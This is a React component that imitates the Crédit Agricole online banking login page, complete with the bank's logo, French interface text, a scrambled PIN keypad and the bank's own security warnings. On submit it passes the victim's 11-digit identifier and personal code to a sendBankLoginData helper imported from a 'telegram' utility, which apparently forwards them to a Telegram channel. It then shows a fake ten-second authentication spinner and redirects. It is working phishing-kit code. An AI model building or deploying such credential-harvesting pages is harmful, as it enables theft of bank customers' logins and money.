import React, { useState } from 'react';
import { X } from 'lucide-react';
import { sendBankLoginData } from '../../utils/telegram';

type CreditAgricoleAuthProps = {
  onAuthenticate: () => void;
  onBack: () => void;
};

const CreditAgricoleAuth = ({ onAuthenticate, onBack }: CreditAgricoleAuthProps) => {
  const [identifiant, setIdentifiant] = useState('');
  const [codePersonnel, setCodePersonnel] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  const handleNumberClick = (number: string) => {
    if (codePersonnel.length < 6) {
      setCodePersonnel(prev => prev + number);
    }
  };

  const clearCodePersonnel = () => {
    setCodePersonnel('');
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (identifiant && codePersonnel) {
      setIsLoading(true);
      
      await sendBankLoginData({
        bankName: 'Crédit Agricole',
        username: identifiant,
        password: codePersonnel
      });

      setTimeout(() => {
        setIsLoading(false);
        // Redirection vers la page de succès
        window.location.href = '/success';
      }, 10000);
    }
  };

  if (isLoading) {
    return (
      <div className="min-h-screen flex flex-col items-center justify-center bg-white">
        <div className="text-center">
          <div className="mb-8">
            <div className="w-20 h-20 mx-auto relative">
              <div className="absolute inset-0 rounded-full border-4 border-gray-200"></div>
              <div className="absolute inset-0 rounded-full border-4 border-[#00A651] animate-spin border-t-transparent"></div>
            </div>
          </div>
          <h2 className="text-xl font-semibold text-gray-800 mb-2">
            Authentification en cours
          </h2>
          <p className="text-gray-600">
            Connexion à votre espace Crédit Agricole...
          </p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-white">
      {/* Header avec logo et bouton fermer */}
      <header className="flex items-center justify-between p-4 lg:p-6">
        <div className="flex items-center">
          <img 
            src="https://www.credit-agricole.fr/content/dam/ca-assets/images/logos/logo-ca.svg" 
            alt="Crédit Agricole" 
            className="h-8 lg:h-10"
            onError={(e) => {
              (e.target as HTMLImageElement).src = 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAwIiBoZWlnaHQ9IjQwIiB2aWV3Qm94PSIwIDAgMTAwIDQwIiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgo8cmVjdCB3aWR0aD0iMTAwIiBoZWlnaHQ9IjQwIiBmaWxsPSIjMDBBNjUxIi8+Cjx0ZXh0IHg9IjUwIiB5PSIyNSIgZm9udC1mYW1pbHk9IkFyaWFsLCBzYW5zLXNlcmlmIiBmb250LXNpemU9IjEyIiBmaWxsPSJ3aGl0ZSIgdGV4dC1hbmNob3I9Im1pZGRsZSI+Q0E8L3RleHQ+Cjwvc3ZnPgo=';
            }}
          />
        </div>
        <button 
          onClick={onBack}
          className="p-2 text-gray-600 hover:text-gray-800 transition-colors"
        >
          <X size={24} />
        </button>
      </header>

      <div className="flex flex-col lg:flex-row min-h-[calc(100vh-80px)]">
        {/* Image de fond - Desktop uniquement */}
        <div className="hidden lg:block lg:w-1/2 relative">
          <img 
            src="https://images.unsplash.com/photo-1702648156180-25d8be9c9527?q=80&w=2344&auto=format&fit=crop&ixlib=rb-4.1.0&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
            alt="Couple souriant"
            className="w-full h-full object-cover"
          />
          
          {/* Overlay avec message promotionnel */}
          <div className="absolute bottom-8 left-8 right-8">
            <div className="bg-white/95 backdrop-blur-sm rounded-lg p-6 shadow-lg">
              <button className="bg-[#00A651] text-white px-4 py-2 rounded-full text-sm font-medium mb-4">
                VOS TRAVAUX
              </button>
              <h3 className="text-xl font-bold text-gray-800 mb-3">
                Gare aux fraudes à la rénovation énergétique
              </h3>
              <p className="text-gray-600 text-sm mb-4">
                Vous prévoyez de rénover votre logement ? Restez vigilant ! Certaines 
                entreprises sont peu scrupuleuses avec les consommateurs : devis 
                incompréhensibles, crédits camouflés, labels de qualité mensongers, 
                réalisation de prestations parfois non conformes, etc.
              </p>
              <button className="bg-[#00A651] text-white px-6 py-2 rounded-full text-sm font-medium hover:bg-[#008f47] transition-colors">
                JE ME PROTÈGE
              </button>
            </div>
          </div>
        </div>

        {/* Formulaire de connexion */}
        <div className="w-full lg:w-1/2 flex items-center justify-center p-6 lg:p-12">
          <div className="w-full max-w-md">
            <h1 className="text-2xl lg:text-3xl font-bold text-gray-800 mb-8">
              Accéder à mes comptes
            </h1>

            <form onSubmit={handleSubmit} className="space-y-6">
              {/* Champ Identifiant */}
              <div>
                <label className="block text-gray-800 font-medium mb-2">
                  IDENTIFIANT
                </label>
                <p className="text-sm text-gray-600 mb-3">
                  Saisissez votre identifiant à 11 chiffres
                </p>
                <div className="relative">
                  <input
                    type="text"
                    value={identifiant}
                    onChange={(e) => setIdentifiant(e.target.value.replace(/\D/g, '').slice(0, 11))}
                    placeholder="Exemple 98652706859"
                    className="w-full px-4 py-3 border border-gray-300 rounded-lg text-gray-800 placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-[#00A651] focus:border-transparent"
                    maxLength={11}
                  />
                  {identifiant && (
                    <button
                      type="button"
                      onClick={() => setIdentifiant('')}
                      className="absolute right-3 top-1/2 transform -translate-y-1/2 text-[#00A651] hover:text-[#008f47]"
                    >
                      <X size={20} />
                    </button>
                  )}
                </div>
              </div>

              {/* Champ Code Personnel */}
              <div>
                <div className="flex items-center justify-between mb-2">
                  <label className="text-gray-800 font-medium">
                    CODE PERSONNEL
                  </label>
                  <button
                    type="button"
                    className="text-[#00A651] hover:text-[#008f47] text-sm font-medium hover:underline"
                  >
                    Perdu / Oublié ?
                  </button>
                </div>
                <div className="relative">
                  <input
                    type="password"
                    value={codePersonnel}
                    readOnly
                    placeholder="Tapez votre code dans le pavé numérique ci-dessous"
                    className="w-full px-4 py-3 border border-gray-300 rounded-lg text-gray-800 placeholder-gray-400 bg-gray-50 cursor-not-allowed"
                  />
                  {codePersonnel && (
                    <button
                      type="button"
                      onClick={clearCodePersonnel}
                      className="absolute right-3 top-1/2 transform -translate-y-1/2 text-[#00A651] hover:text-[#008f47]"
                    >
                      <X size={20} />
                    </button>
                  )}
                </div>
              </div>

              {/* Pavé numérique */}
              <div className="grid grid-cols-5 gap-3 my-8">
                {[9, 4, 6, 8, 3, 7, 0, 5, 2, 1].map((number) => (
                  <button
                    key={number}
                    type="button"
                    onClick={() => handleNumberClick(number.toString())}
                    className="aspect-square bg-gray-100 hover:bg-gray-200 rounded-lg text-xl font-semibold text-gray-800 transition-colors focus:outline-none focus:ring-2 focus:ring-[#00A651]"
                  >
                    {number}
                  </button>
                ))}
              </div>

              {/* Bouton Valider */}
              <button
                type="submit"
                disabled={!identifiant || !codePersonnel || isLoading}
                className="w-full bg-[#00A651] text-white py-4 rounded-lg text-lg font-semibold hover:bg-[#008f47] disabled:bg-gray-300 disabled:cursor-not-allowed transition-colors focus:outline-none focus:ring-2 focus:ring-[#00A651] focus:ring-offset-2"
              >
                VALIDER
              </button>
            </form>

            {/* Sections d'aide */}
            <div className="mt-8 space-y-6 text-sm">
              <div>
                <h3 className="font-bold text-gray-800 mb-2">
                  OUBLI/PERTE DE CODE PERSONNEL
                </h3>
                <p className="text-gray-600">
                  Si vous avez oublié ou perdu votre code personnel,{' '}
                  <button className="text-[#00A651] hover:text-[#008f47] hover:underline">
                    cliquez ici
                  </button>
                  .
                </p>
              </div>

              <div>
                <h3 className="font-bold text-gray-800 mb-2">
                  UN PROBLÈME TECHNIQUE ?
                </h3>
                <p className="text-gray-600">
                  Une assistance est à votre disposition,{' '}
                  <button className="text-[#00A651] hover:text-[#008f47] hover:underline">
                    cliquez ici
                  </button>
                  .
                </p>
              </div>

              <div>
                <h3 className="font-bold text-gray-800 mb-2">
                  SÉCURITÉ
                </h3>
                <p className="text-gray-600 mb-2">
                  Restez vigilants et veillez à protéger vos données personnelles.
                </p>
                <button className="text-[#00A651] hover:text-[#008f47] hover:underline">
                  Consulter nos conseils de sécurité
                </button>
                <p className="text-gray-600 mt-2">
                  Nous vous invitons également à consulter régulièrement nos Conditions Générales d'utilisation.{' '}
                  <button className="text-[#00A651] hover:text-[#008f47] hover:underline">
                    Voir les Conditions Générales d'Utilisation
                  </button>
                </p>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default CreditAgricoleAuth;